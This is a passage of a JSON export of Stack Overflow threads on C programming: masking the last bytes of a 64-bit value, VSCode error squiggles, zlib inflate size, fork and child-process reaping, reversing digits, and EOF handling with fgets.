printf(\"0x%\" PRIx64 \".%\" PRIu64 \".%04\" PRIx64 \"\",\n          (val&amp;0xFFFFFFFF00000000)&gt;&gt;32, \n          (val&amp;0x00000000FF000000)&gt;&gt;24,\n          (val&amp;0x000000000000FFFF)\n          );\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1058, "user_id": 2438650, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/55c2b3926bd8282c899903b32a6f002b?s=128&d=identicon&r=PG", "display_name": "lod", "link": "https://stackoverflow.com/users/2438650/lod"}, "is_accepted": false, "score": 1, "last_activity_date": 1542161008, "creation_date": 1542161008, "answer_id": 53292154, "question_id": 53291950, "link": "https://stackoverflow.com/questions/53291950/get-last-two-bytes-from-a-64bit-value/53292154#53292154", "title": "Get last two bytes from a 64bit value", "body": "<p>I took the liberty of rewriting the code for you, dropping the massive masks and adding the awful inttypes printf defines.</p>\n\n<pre><code>#include &lt;inttypes.h&gt;\n#include &lt;stdio.h&gt;\n\nuint64_t val  = 0xabcdabcd010001b0;\n\nint main() {\n    printf(\"0x%\" PRIX64 \".%\" PRIx64 \".%04\" PRIx64 \"\\n\",\n        val &gt;&gt; 32, \n        (val &gt;&gt; 24) &amp; 0xFF,\n        val &amp; 0xFFFF\n    );  \n    return 0;\n}   \n</code></pre>\n\n<p>Note that the only functional change is adding the leading zeros to the third print argument.</p>\n"}], "owner": {"reputation": 1537, "user_id": 968000, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/tU8sw.jpg?s=128&g=1", "display_name": "user968000", "link": "https://stackoverflow.com/users/968000/user968000"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 221, "favorite_count": 0, "accepted_answer_id": 53292134, "answer_count": 4, "score": 2, "last_activity_date": 1542173772, "creation_date": 1542159398, "last_edit_date": 1542173772, "question_id": 53291950, "link": "https://stackoverflow.com/questions/53291950/get-last-two-bytes-from-a-64bit-value", "title": "Get last two bytes from a 64bit value", "body": "<p>I am getting <code>0xABCDABCD.0.1</code> when I run the following code. I wanted to get the last two bytes <code>01b0</code> from val, but the output shows as <code>1</code>. I am masking the last two bytes using : <code>0x000000000000FFFF</code></p>\n\n<pre><code>uint64_t val  = 0xabcdabcd010001b0;\n\nint main() {\n\n\n   printf(\"0x%X.%d.%x\",(val&amp;0xFFFFFFFF00000000)&gt;&gt;32, \n    (val&amp;0x00000000FF000000)&gt;&gt;24,(val&amp;0x000000000000FFFF));\n   return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "visual-studio-code", "vscode-settings"], "answers": [{"comments": [{"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 2, "creation_date": 1542179485, "post_id": 53294574, "comment_id": 93470566, "body": "Concise answer and a link to more. That&#39;s a good answer. For small C projects, I find it easier to simply use the &quot;Developer Command Prompt&quot; and simply compile directly from the command line. From the command line you can build 5 small projects in the time it takes to navigate the menus just to find the wanted settings in the IDE <code>:)</code>"}, {"owner": {"reputation": 24693, "user_id": 10190237, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f95f50f67af8a9658c5d76df263b323?s=128&d=identicon&r=PG&f=1", "display_name": "P.W", "link": "https://stackoverflow.com/users/10190237/p-w"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1542179649, "post_id": 53294574, "comment_id": 93470629, "body": "@DavidC.Rankin: I do the same. I mainly use the IDE for writing code and debugging purposes."}, {"owner": {"reputation": 63, "user_id": 10649314, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1313816d2b677bfd56218251063ca7a2?s=128&d=identicon&r=PG&f=1", "display_name": "Myspace", "link": "https://stackoverflow.com/users/10649314/myspace"}, "edited": false, "score": 1, "creation_date": 1542240117, "post_id": 53294574, "comment_id": 93501948, "body": "I tried your idea and it unfortunately failed. The issue is not the squigglies, it&#39;s that it does not detect the problem. For example, if I don&#39;t use a function, it will spit back an error in the problems tab. However, it still does not do that even with error squigglies enabled."}], "tags": [], "owner": {"reputation": 24693, "user_id": 10190237, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f95f50f67af8a9658c5d76df263b323?s=128&d=identicon&r=PG&f=1", "display_name": "P.W", "link": "https://stackoverflow.com/users/10190237/p-w"}, "is_accepted": false, "score": 4, "last_activity_date": 1542179094, "last_edit_date": 1542179094, "creation_date": 1542178300, "answer_id": 53294574, "question_id": 53291870, "link": "https://stackoverflow.com/questions/53291870/problems-not-showing-up-for-c-code-in-vscode/53294574#53294574", "title": "Problems not showing up for c code in vscode", "body": "<p>In the workspace settings <code>json</code> file, you can add the following line.</p>\n\n<pre><code>\"C_Cpp.errorSquiggles\": \"Enabled\"\n</code></pre>\n\n<p>That will show the squiggles for both C and C++ files.</p>\n\n<p>This <a href=\"https://code.visualstudio.com/docs/getstarted/settings\" rel=\"nofollow noreferrer\">link</a> is an useful overview on changing the settings. You will find the language specific editor settings there as well.</p>\n"}, {"tags": [], "owner": {"reputation": 63, "user_id": 10649314, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1313816d2b677bfd56218251063ca7a2?s=128&d=identicon&r=PG&f=1", "display_name": "Myspace", "link": "https://stackoverflow.com/users/10649314/myspace"}, "is_accepted": true, "score": 0, "last_activity_date": 1542246158, "creation_date": 1542246158, "answer_id": 53311273, "question_id": 53291870, "link": "https://stackoverflow.com/questions/53291870/problems-not-showing-up-for-c-code-in-vscode/53311273#53311273", "title": "Problems not showing up for c code in vscode", "body": "<p>Update! For anyone who is dealing with this hassle here are the four steps I followed. First do what @P.W suggested with the error squigglies. </p>\n\n<p>Secondly, uninstall VSCode. </p>\n\n<p>Next, go to %appdata% and delete the Code folder</p>\n\n<p>Finally, reinstall VSCode.</p>\n\n<p>Hopefully, those steps will solve this problem for anyone who has been looking.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 15449002, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AOh14GjF15UcD8DJ3Ri_SkIbntwV3R2BONPDVDKxIHBpyg=k-s128", "display_name": "Jay Ghughriwala", "link": "https://stackoverflow.com/users/15449002/jay-ghughriwala"}, "is_accepted": false, "score": 0, "last_activity_date": 1617100259, "last_edit_date": 1617100259, "creation_date": 1617098139, "answer_id": 66868655, "question_id": 53291870, "link": "https://stackoverflow.com/questions/53291870/problems-not-showing-up-for-c-code-in-vscode/66868655#66868655", "title": "Problems not showing up for c code in vscode", "body": "<p>In your working folder, you can also see a <code>.vscode</code> folder. Find <code>settings.json</code> and open it. Find the following line:</p>\n<pre><code>C_Cpp.errorSquiggles&quot;: &quot;Disabled&quot;,\n</code></pre>\n<p>Replace the text <code>Disabled</code> with <code>Enabled</code>, and turn your Problem Checker On.</p>\n"}], "owner": {"reputation": 63, "user_id": 10649314, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1313816d2b677bfd56218251063ca7a2?s=128&d=identicon&r=PG&f=1", "display_name": "Myspace", "link": "https://stackoverflow.com/users/10649314/myspace"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2402, "favorite_count": 1, "accepted_answer_id": 53311273, "answer_count": 3, "score": 2, "last_activity_date": 1617100259, "creation_date": 1542158769, "question_id": 53291870, "link": "https://stackoverflow.com/questions/53291870/problems-not-showing-up-for-c-code-in-vscode", "title": "Problems not showing up for c code in vscode", "body": "<p>I was doing a little bit of work on my c file when I accidentally turned off the setting which underlines problems. I'm a C novice so this tab is extremely helpful for me to figure out what I did wrong. </p>\n\n<p>My question is what setting turns on error squigglies for C code. An important thing to note is that every other language I program in, the problems show up. So I'm 100% certain that it's language specific. </p>\n\n<p>Thanks in advance.</p>\n"}, {"tags": ["c", "zlib"], "comments": [{"owner": {"reputation": 78348, "user_id": 1180620, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/FXaAg.jpg?s=128&g=1", "display_name": "Mark Adler", "link": "https://stackoverflow.com/users/1180620/mark-adler"}, "edited": false, "score": 1, "creation_date": 1542165289, "post_id": 53291804, "comment_id": 93466715, "body": "I don&#39;t understand what you&#39;re asking. You should elaborate with an example of what you imagine doing."}, {"owner": {"reputation": 135, "user_id": 1953832, "user_type": "registered", "accept_rate": 23, "profile_image": "https://graph.facebook.com/15601067/picture?type=large", "display_name": "Farhan Yusufzai", "link": "https://stackoverflow.com/users/1953832/farhan-yusufzai"}, "reply_to_user": {"reputation": 78348, "user_id": 1180620, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/FXaAg.jpg?s=128&g=1", "display_name": "Mark Adler", "link": "https://stackoverflow.com/users/1180620/mark-adler"}, "edited": false, "score": 0, "creation_date": 1542208245, "post_id": 53291804, "comment_id": 93487365, "body": "I am parsing out some zlib deflated content, which has a header. The header determines the type of content (binary or otherwise). In some cases, I just want to deflate the header. At other times, I need to deflate the entire thing. I was wondering if I could write a deflation function that will return X bytes of inflated text, irrespective of the count of deflated text.  I hope this is more clear (I can update the question if need be) - Also, thank you for your hard work on zlib. We appreciate it, and I am honored to receive a comment from you."}, {"owner": {"reputation": 78348, "user_id": 1180620, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/FXaAg.jpg?s=128&g=1", "display_name": "Mark Adler", "link": "https://stackoverflow.com/users/1180620/mark-adler"}, "edited": false, "score": 0, "creation_date": 1542210199, "post_id": 53291804, "comment_id": 93488529, "body": "Please edit that into the question, not leave it in a comment."}], "answers": [{"tags": [], "owner": {"reputation": 78348, "user_id": 1180620, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/FXaAg.jpg?s=128&g=1", "display_name": "Mark Adler", "link": "https://stackoverflow.com/users/1180620/mark-adler"}, "is_accepted": true, "score": 0, "last_activity_date": 1542210297, "creation_date": 1542210297, "answer_id": 53303914, "question_id": 53291804, "link": "https://stackoverflow.com/questions/53291804/how-to-specify-zlib-inflation-size/53303914#53303914", "title": "How to specify zlib inflation size", "body": "<p>If you set <code>avail_out</code> to <em>n</em>, then <code>inflate()</code> will return at most <em>n</em> bytes of uncompressed data.</p>\n"}], "owner": {"reputation": 135, "user_id": 1953832, "user_type": "registered", "accept_rate": 23, "profile_image": "https://graph.facebook.com/15601067/picture?type=large", "display_name": "Farhan Yusufzai", "link": "https://stackoverflow.com/users/1953832/farhan-yusufzai"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 70, "favorite_count": 0, "accepted_answer_id": 53303914, "answer_count": 1, "score": -1, "last_activity_date": 1545022266, "creation_date": 1542158157, "last_edit_date": 1545022266, "question_id": 53291804, "link": "https://stackoverflow.com/questions/53291804/how-to-specify-zlib-inflation-size", "title": "How to specify zlib inflation size", "body": "<p>Is there a way to specify a certain number of inflated clear text in zlib? The sample code zpipe.c reads of size CHUNK (16384 bytes) but I do not see where to specify an inflated size. For example, if I only want to read the first 10 bytes before determining if I want to continue the inflation. Is that possible?</p>\n\n<p>Updating question per request:</p>\n\n<p>I am parsing out some zlib deflated content, which has a header. The header determines the type of content (binary or otherwise). In some cases, I just want to deflate the header. At other times, I need to deflate the entire thing. I was wondering if I could write a deflation function that will return X bytes of inflated text, irrespective of the count of deflated text.</p>\n"}, {"tags": ["c", "linux", "process", "operating-system"], "comments": [{"owner": {"reputation": 2721, "user_id": 8767209, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f22597b536b07b41525099a8c16e23ce?s=128&d=identicon&r=PG&f=1", "display_name": "MFisherKDX", "link": "https://stackoverflow.com/users/8767209/mfisherkdx"}, "edited": false, "score": 0, "creation_date": 1542158497, "post_id": 53291801, "comment_id": 93465218, "body": "For Q1: Consider a parent process forking a child process. When the child process terminates, the OS continues to store information about the return status of the child process so that when the parent calls waitpid it can get the return status.  Only after the parent calls waitpid, can the OS can reap the child process."}, {"owner": {"reputation": 2896, "user_id": 9623401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fc011e4b0c3f14ea473726be49db282?s=128&d=identicon&r=PG&f=1", "display_name": "amjad", "link": "https://stackoverflow.com/users/9623401/amjad"}, "reply_to_user": {"reputation": 2721, "user_id": 8767209, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f22597b536b07b41525099a8c16e23ce?s=128&d=identicon&r=PG&f=1", "display_name": "MFisherKDX", "link": "https://stackoverflow.com/users/8767209/mfisherkdx"}, "edited": false, "score": 0, "creation_date": 1542158847, "post_id": 53291801, "comment_id": 93465293, "body": "@MFisherKDX so is the purpose of reaping child processes is just to get return statuses of child processes?"}, {"owner": {"reputation": 2721, "user_id": 8767209, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f22597b536b07b41525099a8c16e23ce?s=128&d=identicon&r=PG&f=1", "display_name": "MFisherKDX", "link": "https://stackoverflow.com/users/8767209/mfisherkdx"}, "edited": false, "score": 0, "creation_date": 1542159184, "post_id": 53291801, "comment_id": 93465352, "body": "Have a read here: <a href=\"https://en.wikipedia.org/wiki/Zombie_process\" rel=\"nofollow noreferrer\">Zombie Process</a>"}], "answers": [{"comments": [{"owner": {"reputation": 2896, "user_id": 9623401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fc011e4b0c3f14ea473726be49db282?s=128&d=identicon&r=PG&f=1", "display_name": "amjad", "link": "https://stackoverflow.com/users/9623401/amjad"}, "edited": false, "score": 0, "creation_date": 1543990719, "post_id": 53291927, "comment_id": 94112372, "body": "Could you also take a look at this question, please? <a href=\"https://stackoverflow.com/questions/53626179/receiving-sigint-and-exception-handles-in-linux\" title=\"receiving sigint and exception handles in linux\">stackoverflow.com/questions/53626179/&hellip;</a>"}], "tags": [], "owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "is_accepted": true, "score": 2, "last_activity_date": 1542159172, "creation_date": 1542159172, "answer_id": 53291927, "question_id": 53291801, "link": "https://stackoverflow.com/questions/53291801/child-processes-memory-allocation-and-the-purpose-of-reaping-child-processes/53291927#53291927", "title": "Child Processes memory allocation and the purpose of reaping child processes", "body": "<blockquote>\n  <p>Q1. Why Linux doesn't have a mechanism of auto reaping child processes, I mean all child processes are terminated and removed once they finished just like garbage collection, so that users don't need to use waitpid to manually reap child processes?</p>\n</blockquote>\n\n<p>It does. Just set SIGCHLD to be ignored and your children will be reaped for you.</p>\n\n<blockquote>\n  <p>Q2. my textbooks says that when users use fork() to create a new child process, the child gets an identical (but separate) copy of the parent\u2019s text, data, and bss segments, heap, and user stack. So does it mean that same size of memory address of parents is allocated to the child as well and the memory content of child is exact then same as its parent?</p>\n</blockquote>\n\n<p>That's an implementation detail. Most modern systems just share the memory between the two processes.</p>\n\n<blockquote>\n  <p>if so, lets say we create a huge number of child processes, isn't that the stack will overflow very easily?</p>\n</blockquote>\n\n<p>No. The stack overflows when you run out of address space in a particular process' view of memory. Since each <code>fork</code> creates a new process, you aren't going to run out of address space in any particular process.</p>\n\n<blockquote>\n  <p>Q3. Lets say the picture below is a parent processes enter image description here\n  ... and you can see the user stack highlighted in red is the stack of the parent. So if the parent program uses fork() and when it executes fork() function, how does child processes' stack get allocated? is the child stack next to current stack?</p>\n</blockquote>\n\n<p>The child process' stack is in another process. So if that's the address space for the parent process' segments, the child process' stack isn't in it at all. The child process begins with a copy of the parent's address space -- typically with the actual memory pages shared, at least until either process tries to modify them (which unshares them).</p>\n"}, {"tags": [], "owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "is_accepted": false, "score": 2, "last_activity_date": 1542161255, "creation_date": 1542161255, "answer_id": 53292188, "question_id": 53291801, "link": "https://stackoverflow.com/questions/53291801/child-processes-memory-allocation-and-the-purpose-of-reaping-child-processes/53292188#53292188", "title": "Child Processes memory allocation and the purpose of reaping child processes", "body": "<p>Although David Schwartz <a href=\"https://stackoverflow.com/a/53291927/1475978\">already answered</a> the stated questions, I'd like to talk about the underlying picture. So, do not consider this an answer, but an extended comment.</p>\n\n<p>The problem is, the image shown is not a good representation of the address space a normal userspace application sees on current computers and operating systems.</p>\n\n<p>Each process has their own address space.  This is implemented using <a href=\"https://en.wikipedia.org/wiki/Virtual_memory\" rel=\"nofollow noreferrer\">virtual memory</a>; a mapping from virtual addresses to actual hardware accesses that is for all intents and purposes invisible to the userspace process. (Virtual memory is not per-address, but uses smallish chunks called <a href=\"https://en.wikipedia.org/wiki/Page_(computer_memory)\" rel=\"nofollow noreferrer\">pages</a>. On all current architectures, each page is a power of two bytes in size. 2<sup>12</sup> = 4096 is common, but other sizes like 2<sup>16</sup> = 65536 and 2<sup>21</sup> = 2097152 are also used.)</p>\n\n<p>Even when you use shared memory, it can reside at different virtual addresses for different processes. (This is also the reason you cannot really use pointers in shared memory.)</p>\n\n<p>When a process is fork()ed, the virtual memory is cloned. (It is not really <em>copied</em> per se, as that would waste resources. Usually a technique called <a href=\"https://en.wikipedia.org/wiki/Copy-on-write\" rel=\"nofollow noreferrer\">copy-on-write</a> is used by the OS kernel, so that the actual same physical RAM is used for memory used by both/all processes, until one of them modifies their \"copy\"; at which point the OS kernel detaches the affected page duplicating its contents, before allowing the modifiaction to proceed.)</p>\n\n<p>This means that after a fork(), the parent and child processes will have their stacks at exactly the same virtual addresses.</p>\n\n<p>The only limit is how much actual RAM there is available.  Actually, the OS kernel can also move currently unused files to <a href=\"https://en.wikipedia.org/wiki/Paging\" rel=\"nofollow noreferrer\">swap or paging file</a>; but if those pages end up being needed soon, it slows down the operation of the machine.  On Linux at least, binaries and libraries also get directly mapped to their respective files -- that being the reason why you can't modify executable files when they are in use --, so unless the RAM copy of the code is modified, they tend to not use swap/paging file.</p>\n\n<p>In most cases, some of the virtual memory range is reserved for the OS kernel. It does <em>not</em> mean that the kernel memory is visible to userspace, or accessible in any way; it is just a way to ensure that when transferring data to or from userspace processes, the OS kernel can use the userspace virtual memory addresses, and not mix them with its own internal addresses.  Essentially, the OS kernel just won't create any virtual memory mappings to addresses it uses itself, for any userspace process, to make its own job simpler.</p>\n\n<p>An interesting detail on Linux is that typically, the default stack size for new threads is rather large, 8 MiB (8,388,608 bytes) on 32-bit x86.  Unless you set a smaller stack, the number of threads a process can create is limited by the available virtual memory. Each userspace process can use the lower 3 GiB, or virtual memory addresses below 3,221,225,472 on 32-bit x86; and you can fit at most 384 8 MiB stacks in that.  If you account for the standard libraries and so on, typically on those systems a process can create about 300 threads, before it runs out virtual memory.  If you use a much smaller stack, say 65536 bytes, a process can create thousands of threads even on 32-bit x86.  Just remember that the issue there is <em>running out of usable virtual memory address space</em>, not memory per se.</p>\n"}], "owner": {"reputation": 2896, "user_id": 9623401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fc011e4b0c3f14ea473726be49db282?s=128&d=identicon&r=PG&f=1", "display_name": "amjad", "link": "https://stackoverflow.com/users/9623401/amjad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 775, "favorite_count": 0, "accepted_answer_id": 53291927, "answer_count": 2, "score": 0, "last_activity_date": 1542161255, "creation_date": 1542158130, "last_edit_date": 1542158664, "question_id": 53291801, "link": "https://stackoverflow.com/questions/53291801/child-processes-memory-allocation-and-the-purpose-of-reaping-child-processes", "title": "Child Processes memory allocation and the purpose of reaping child processes", "body": "<p>I'm a beginner in processes, still struggling to understand the purpose of reaping child processes and memory allocation for them, so my questions are:</p>\n\n<p>Q1. Why Linux doesn't have a mechanism of auto reaping child processes, I mean all child processes are terminated and removed once they finished just like garbage collection, so that users don't need to use <code>waitpid</code> to manually reap child processes?</p>\n\n<p>Q2. my textbooks says that when users use fork() to create a new child process, the child gets an identical (but separate) copy of the parent\u2019s text, data, and bss segments, heap, and user stack. So does it mean that same size of memory address of parents is allocated to the child as well and the memory content of child is exact then same as its parent? if so, lets say we create a huge number of child processes, isn't that the stack will overflow very easily?</p>\n\n<p>Q3. Lets say the picture below is a parent processes\n<a href=\"https://i.stack.imgur.com/tOMd1.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/tOMd1.jpg\" alt=\"enter image description here\"></a></p>\n\n<p>and you can see the user stack highlighted in red is the stack of the parent. So  if the parent program uses fork() and when it executes fork() function, how does child processes' stack get allocated? is the child stack next to current stack</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 1, "creation_date": 1542156977, "post_id": 53291640, "comment_id": 93464880, "body": "After the first time, sum is not 0 anymore. So what happens if sum is the first used digit?"}, {"owner": {"reputation": 103, "user_id": 8057767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2a4630a9a0a0606a00b1867ab9252cb?s=128&d=identicon&r=PG&f=1", "display_name": "luci88filter", "link": "https://stackoverflow.com/users/8057767/luci88filter"}, "edited": false, "score": 0, "creation_date": 1542182191, "post_id": 53291640, "comment_id": 93471639, "body": "It is <code>sum * 10</code> because each iteration you need to shift everything to the <b>left</b> just like when multiplying by 2 in binary you shift everything to the left."}], "answers": [{"tags": [], "owner": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "is_accepted": false, "score": 3, "last_activity_date": 1542157431, "last_edit_date": 1542157431, "creation_date": 1542157066, "answer_id": 53291668, "question_id": 53291640, "link": "https://stackoverflow.com/questions/53291640/reversing-an-entered-numbers-in-c-language/53291668#53291668", "title": "Reversing an entered numbers in C language", "body": "<p>In a situation like this it is a very good thing to examine what is happening with simple printouts. If you insert <code>printf(\"sum: %d digit: %d number: %d\\n\", sum, digit, number);</code> before the if statement, it will become obvious what's going on.</p>\n\n<pre><code>$ ./a.out \nEnter numbers\n2345\nsum: 5 digit: 5 number: 234\nsum: 54 digit: 4 number: 23\nsum: 543 digit: 3 number: 2\nsum: 5432 digit: 2 number: 0\nReversed Number = 2345\nReversed Number = 5432\n</code></pre>\n\n<p>Sidenote: There are \"approved\" ways of using goto. This is not one of them. You should switch </p>\n\n<pre><code>START:\n...\nif(number&gt;0)\n    goto START;\n</code></pre>\n\n<p>to</p>\n\n<pre><code>do {\n...\n} while(number&gt;0)\n</code></pre>\n"}], "owner": {"reputation": 17, "user_id": 6895332, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1d14d308fc68946b9f2a1036c103b88?s=128&d=identicon&r=PG&f=1", "display_name": "Mark Asnee", "link": "https://stackoverflow.com/users/6895332/mark-asnee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 43, "favorite_count": 2, "answer_count": 1, "score": 0, "last_activity_date": 1542157431, "creation_date": 1542156740, "last_edit_date": 1542157176, "question_id": 53291640, "link": "https://stackoverflow.com/questions/53291640/reversing-an-entered-numbers-in-c-language", "title": "Reversing an entered numbers in C language", "body": "<p>I just want to ask on why is there a need to write <code>sum = sum*10+digit</code> instead of just <code>sum = 0+digit</code>? since the result of <code>sum*10</code> is just 0. This is a code in C language for reversing an entered number. Thanks!</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int number, x = 0, digit, temporary, div = 10, sum = 0;\n    printf(\"Enter numbers\\n\");\n    scanf(\"%d\", &amp;number);\n    temporary = number;\n\nSTART:\n\n    digit = number%div;\n    sum = sum*10+digit;\n    number = number/div;\n\n    if(number&gt;0)\n        goto START;\n\n    printf(\"Reversed Number = %d\\n\", temporary);\n    printf(\"Reversed Number = %d\\n\", sum);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "input", "stdin", "fgets"], "comments": [{"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 3, "creation_date": 1542154201, "post_id": 53291238, "comment_id": 93464212, "body": "Your code will <i>always</i> print <code>&quot;EOF&quot;</code>, since <code>EOF</code> is, per the standard, non-zero and fixed. Checking for an empty line (single newline only) is trivial. <code>while(fgets(input,1024,stdin)!=NULL &amp;&amp; *input != &#39;\\n&#39;)</code> , but that won&#39;t solve your issue following the while-loop."}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 1, "creation_date": 1542154318, "post_id": 53291238, "comment_id": 93464248, "body": "Look up what <code>fgets</code> returns on success and end-of-file. It is really well documented behavior."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 4, "creation_date": 1542154786, "post_id": 53291238, "comment_id": 93464364, "body": "I don&#39;t think I have ever seen someone try <code>if(EOF)</code> before ... congratulations on finding something new to try in C"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1542155007, "post_id": 53291238, "comment_id": 93464416, "body": "When you don&#39;t use command line arguments in the program, the appropriate form for the definition of <code>main()</code> is <code>int main(void)</code>."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1542155167, "post_id": 53291238, "comment_id": 93464451, "body": "Where you have <code>if (EOF)</code> is, interestingly, one of the few places where it might be appropriate to use <code>feof()</code> instead: <code>if (feof(stdin)) printf(&quot;EOF\\n&quot;); else if (ferror(stdin)) printf(&quot;ERR\\n&quot;); else assert(&quot;can&#39;t happen&quot; == 0);</code> would be correct.  Beware though: <a href=\"https://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\">Why is <code>while (!feof(file))</code> always wrong?</a>"}], "answers": [{"tags": [], "owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "is_accepted": true, "score": 1, "last_activity_date": 1542156203, "last_edit_date": 1542156203, "creation_date": 1542155768, "answer_id": 53291498, "question_id": 53291238, "link": "https://stackoverflow.com/questions/53291238/how-to-use-eof-with-fgets-in-c/53291498#53291498", "title": "how to use EOF with fgets() in C", "body": "<p>One easy thing that you could do is to check the length of the string read in by <code>fgets</code>.  The newline character at the end of the input string is considered a valid character by <code>fgets</code>.  That means that the length of the string you're testing would be 1 if you just entered a newline  So, you want to move the test inside the loop instead of trying to test for EOF outside of the loop.  So, your code should look like this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(void) {\n    char input[1024];\n\n    while(fgets(input,1024,stdin)!=NULL) {\n        printf(\"%s\", input);\n        if(strlen(input) == 1) {\n            printf(\"EOF\\n\");\n            break;\n        }\n    }\n    return 0;\n}\n</code></pre>\n\n<p>Also note, to get the EOF test to work you wouldn't hit enter, instead you'd send the end of file key, like CTRL-D on linux to your program.  In this case you wouldn't have a strlen test inside the loop.</p>\n"}], "owner": {"reputation": 33, "user_id": 9366713, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f591a462c3a698bc17fe6ff1f9f602d9?s=128&d=identicon&r=PG&f=1", "display_name": "halo2x2", "link": "https://stackoverflow.com/users/9366713/halo2x2"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2781, "favorite_count": 0, "accepted_answer_id": 53291498, "answer_count": 1, "score": 0, "last_activity_date": 1542156203, "creation_date": 1542153669, "question_id": 53291238, "link": "https://stackoverflow.com/questions/53291238/how-to-use-eof-with-fgets-in-c", "title": "how to use EOF with fgets() in C", "body": "<p>I'm trying to read in inputs from the terminal, I want to stop reading inputs if there is a blank line and enter is pressed. Here is what I have at the moment.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n   int main(int argc,char const *argv[]){\n       char input[1024];\n\n       while(fgets(input,1024,stdin)!=NULL){\n   